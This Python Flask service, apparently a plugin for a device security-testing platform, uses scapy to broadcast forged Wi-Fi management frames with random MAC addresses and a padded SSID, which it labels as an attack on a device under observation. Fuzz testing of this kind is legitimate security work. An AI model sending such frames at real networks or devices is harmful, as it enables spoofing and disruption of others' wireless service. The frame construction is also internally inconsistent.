import re,os,sys,time,signal,subprocess,json,random,string,argparse
from flask import Flask,request,jsonify
import requests
import threading
from scapy.all import *

################ Flask launch #########################

PLATFORM_URL = "https://127.0.0.1:7000/api/service/result"
WEB_SERVER = "127.0.0.1"
PORT = 10002
app = Flask(__name__)

#######################################################

def wifi_fuzz_test(pkt, essid):
    pkt /= Dot11Elt(ID="SSID", info=essid, len=len(essid))
    sendp(pkt, inter=0.100, count=100, verbose=0)
    print("攻击开始,请观察设备信息")

#######################################################

def fuzz_ssid(essid):
    if len(essid) < 32:
        return essid + '\x00' * (32 - len(essid))
    return essid[:32]

#######################################################

def fuzz_start(ssid,device):
    if ssid == "0":
        print("Error")
        sys.exit()
    target_ssid = ssid
    pkt = RadioTap() / Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(), addr3=RandMAC()) / Dot11Beacon(cap="ESS")
    fuzzed_frame = fuzz_ssid(target_ssid)
    wifi_fuzz_test(pkt, fuzzed_frame)

#######################################################

@app.route('/start', methods=['POST'])
def run_threading_check():
    result = {}
    params = request.json
    if params != None:
        ssid = params.get("ssid")
        device = params.get("device")
        t = threading.Thread(target=fuzz_start, args=(ssid, device,))
        t.start()
        result["message"] = "攻击开始,请观察设备信息"
    else:
        result["status"] = "error"
        result["message"] = "Invalid parameters"
    return result
 

#######################################################

def WIFISecurity():
    jsdata = request.get_json()
    print('-------------------------',jsdata)
    if jsdata != None:
        r = run_threading_check()
        response = app.response_class(
           response=json.dumps(r),
           mimetype='application/json'
        )
        return "Plugin Start Execution"
    else:
        return 'No parameters'
                
app.run(host=WEB_SERVER, port=PORT)
